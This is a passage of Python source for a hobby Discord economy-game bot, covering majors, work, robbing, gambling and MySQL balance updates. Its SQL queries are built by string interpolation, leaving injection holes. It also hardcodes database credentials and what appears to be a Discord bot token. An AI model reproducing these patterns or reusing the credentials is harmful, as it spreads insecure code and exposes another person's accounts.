                my_cursor.execute(f"UPDATE geb_economy SET total_edu_var = 0 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                await ctx.send(embed=embedi)
            else:
                embedi = discord.Embed(title=major,description=':mortar_board: you already own a degree in this, try a different major', color=(0xFFD700))
                await ctx.send(embed=embedi)
    if int(edun) == 5:
        my_cursor.execute(f"SELECT edu_list FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
        for edu_list in my_cursor:
            edu_list=functools.reduce(operator.add, (edu_list))
            if not 'health' in edu_list:
                my_cursor.execute(f"UPDATE geb_economy SET education = 'health' WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                my_cursor.execute(f"UPDATE geb_economy SET total_edu_var = 0 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                await ctx.send(embed=embedi)
            else:
                embedi = discord.Embed(title=major,description=':mortar_board: you already own a degree in this, try a different major', color=(0xFFD700))
                await ctx.send(embed=embedi)
    if int(edun) == 6:
        my_cursor.execute(f"SELECT edu_list FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
        for edu_list in my_cursor:
            edu_list=functools.reduce(operator.add, (edu_list))
            if not 'compsci' in edu_list:
                my_cursor.execute(f"UPDATE geb_economy SET education = 'compsci' WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                my_cursor.execute(f"UPDATE geb_economy SET total_edu_var = 0 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                await ctx.send(embed=embedi)
            else:
                embedi = discord.Embed(title=major,description=':mortar_board: you already own a degree in this, try a different major', color=(0xFFD700))
                await ctx.send(embed=embedi)
    if int(edun) == 7:
        my_cursor.execute(f"SELECT edu_list FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
        for edu_list in my_cursor:
            edu_list=functools.reduce(operator.add, (edu_list))
            if not 'politics' in edu_list:
                my_cursor.execute(f"UPDATE geb_economy SET education = 'politics' WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                my_cursor.execute(f"UPDATE geb_economy SET total_edu_var = 0 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                await ctx.send(embed=embedi)
            else:
                embedi = discord.Embed(title=major,description=':mortar_board: you already own a degree in this, try a different major', color=(0xFFD700))
                await ctx.send(embed=embedi)
    if int(edun) == 8:
        my_cursor.execute(f"SELECT edu_list FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
        for edu_list in my_cursor:
            edu_list=functools.reduce(operator.add, (edu_list))
            if not 'business' in edu_list:
                my_cursor.execute(f"UPDATE geb_economy SET education = 'business' WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                my_cursor.execute(f"UPDATE geb_economy SET total_edu_var = 0 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                await ctx.send(embed=embedi)

            else:
                embedi = discord.Embed(title=major,description=':mortar_board: you already own a degree in this, try a different major', color=(0xFFD700))
                await ctx.send(embed=embedi)
    mydb.commit()



@client.command()
async def edu(ctx):
    embedi = discord.Embed(title=':mortar_board: Education', color=(0xFFD700))
    embedi.add_field(name="english(1)",
                     value="max tuition pay $150",
                     inline=True)
    embedi.add_field(name="food(2)",
                     value="max tuition pay $300",
                     inline=True)
    embedi.add_field(name="art(3)",
                     value="max tuition pay $450",
                     inline=True)
    embedi.add_field(name="chem(4)",
                     value="max tuition pay $600",
                     inline=True)
    embedi.add_field(name="health(5)",
                     value="max tuition pay $750",
                     inline=True)
    embedi.add_field(name="compsci(6)",
                     value="max tuition pay $900",
                     inline=True)
    embedi.add_field(name="politics(7)",
                     value="max tuition pay $1050",
                     inline=True)
    embedi.add_field(name="business(8)",
                     value="max tuition pay $1200",
                     inline=True)
    embedi.add_field(name=":envelope_with_arrow: command",
                     value="g!major {number}",
                     inline=False)
    await ctx.send(embed=embedi)
@client.command()
async def economy(ctx):
    embedi = discord.Embed(title=':yen: geb_economy', color=(0xFFD700))
    embedi.add_field(name="g!bank",
                     value="checks your balance, add player name after to check specific player(adds you into the database)",
                     inline=True)
    embedi.add_field(name="g!gamble {heads or tails} {number}",
                     value="gamble a specified amount, luck based. Replace number with all or half to gamble all money or half",
                     inline=True)
    embedi.add_field(name="g!work",
                     value="you start off with a specific job, that job determins the max amount of money you earn using this command (max amount of time you can work a day is 20, can increase with purchases)",
                     inline=True)
    embedi.add_field(name="g!rob {player}",
                     value="rob a player, rates drop if you have robbed more than 7 times that day already and if robbie is online(max rob is 20, increasable with purchases)",
                     inline=True)
    embedi.add_field(name="g!give {amount} {player}",
                     value="withdrawals specified amount of money from your bank and gives it to specified player",
                     inline=True)
    embedi.add_field(name="g!rank",
                     value="check player rankings",
                     inline=True)
    embedi.add_field(name="g!edu",
                     value="shows the available majors and their tuition pay per use",
                     inline=True)
    embedi.add_field(name="g!major {major number}",
                     value="picks what you want to major in ex. 1=english",
                     inline=True)
    embedi.add_field(name="g!learn",
                     value="allows you to learn in the major you are in at the moment, subtracts the tuition from your money. You must learn a specific maor 50 times to earn a degree(max learn a day is 5 can be increased)",
                     inline=True)
    embedi.add_field(name="g!edu_list",
                     value="shows list of your degrees",
                     inline=True)
    embedi.add_field(name="g!edu_info",
                     value="more in depth explanation on what majors do",
                     inline=True)
    await ctx.send(embed=embedi)
@client.command()
async def edu_list(ctx):
    my_cursor.execute(f"SELECT edu_list FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
    for edu_list in my_cursor:
        edu_list=functools.reduce(operator.add, (edu_list))
    embedi = discord.Embed(title=':mortar_board: your degrees',description=edu_list, color=(0xFFD700))
    await ctx.send(embed=embedi)

async def update_name(ctxy):
    my_cursor.execute("SELECT * FROM geb_economy;")
    mip = "'"
    all_p = str(my_cursor.fetchall())
    if not str(ctxy) in all_p:
            my_cursor.execute(f"INSERT INTO geb_economy (discord_id,money,job,work_var,rob_var) VALUES({mip+ctxy+mip},0,'babysiter',0,0)")
            mydb.commit()
    # if the id isnt in the databse then it adds it in

async def update_data(ctxy,exp):
    mip ="'"
    my_cursor.execute(f"UPDATE geb_economy SET money = money+{exp} WHERE discord_id = {mip+ctxy+mip}")
    mydb.commit()
    #adds money or subtracts from moneyval(used generally)
async def update_rob(ctxy,user,exp):
    global nft
    member =user.id
    my_cursor.execute(f"UPDATE geb_economy SET money = money+{exp} WHERE discord_id = {mip + ctxy + mip}")
    my_cursor.execute(f"UPDATE geb_economy SET money = money-{exp} WHERE discord_id = {mip + str(member) + mip}")
    mydb.commit()
    nft = (f"you stole ${exp} from {user.name}")
async def update_give(ctxy,user,exp):
    member =user.id
    my_cursor.execute(f"UPDATE geb_economy SET money = money-{exp} WHERE discord_id = {mip + ctxy + mip}")
    my_cursor.execute(f"UPDATE geb_economy SET money = money+{exp} WHERE discord_id = {mip + str(member) + mip}")
    mydb.commit()
async def update_gamble(ctxy,choice,exp):
    global aft
    global col_val
    bum = random.choice(['heads','tails'])
    if bum == choice:
           my_cursor.execute(f"UPDATE geb_economy SET money = money+{exp} WHERE discord_id = {mip + str(ctxy) + mip}")
           aft = 'you gained: $'+str(exp)
           col_val = 0x25be2a
    else:
        my_cursor.execute(f"UPDATE geb_economy SET money = money-{exp} WHERE discord_id = {mip + str(ctxy) + mip}")
        aft = 'you lost: $'+str(exp)
        col_val=0xEc315a
    mydb.commit()


async def job_list(m):
    global y_job
    if m == 'babysiter':
        y_job=5
    elif m == 'sign_spinner':
        y_job=10
    elif m == 'car_washer':
        y_job=15
    elif m == 'cashier':
        y_job=20
    elif m == 'fry_cook':
        y_job=25
    elif m == 'barista':
        y_job=35
    elif m == 'daycare_assistant':
        y_job=40
    elif m == 'waiter':
        y_job=45
    elif m == 'life_gaurd':
        y_job=50
    elif m == 'house_cleaner':
        y_job=55
    elif m == 'mail_man':
        y_job=60
    elif m == 'butler':
        y_job=65
    elif m == 'amusement_park_clerk':
        y_job=70
    elif m == 'phone_operaor':
        y_job=75
    elif m == 'icecream_truck_driver':
        y_job=80
    elif m == 'plumber':
        y_job=85
    elif m == 'construction_worker':
        y_job=90
#all of the jobs
async def edu_list(m):
    global y_edu
    if m == 'english':
        y_edu=-150
    elif m == 'food':
        y_edu=-300
    elif m == 'art':
        y_edu=-450
    elif m == 'chem':
        y_edu=-600
    elif m== 'health':
        y_edu=-750
    elif m == 'compsci':
        y_edu=-900
    elif m == 'politics':
        y_edu=-1050
    elif m == 'bussiness':
        y_edu=-1200
#all of the  majors(they subtract money)


async def m_loop():
         while True:

                  global mydb
                  global my_cursor
                  mydb = mysql.connector.connect(host="bdrpelbcfmnvbfxgeoe6-mysql.services.clever-cloud.com", user="uhiollzjpdbggq7z",passwd="ETZYMs1wQWWGA1Vnq590",database="bdrpelbcfmnvbfxgeoe6",port=3306)
                  my_cursor = mydb.cursor(buffered=True)
                  await asyncio.sleep(260)

@client.command()
@commands.is_owner()
async def shutdown(context):
    exit()

#testing the push
#new push

client.run('OTA1MjMxMzIwODc0MDk0Njk1.YYHEXQ.iZS2HTl4gsl5Rpkgnej4lfjSvxE', bot=True)
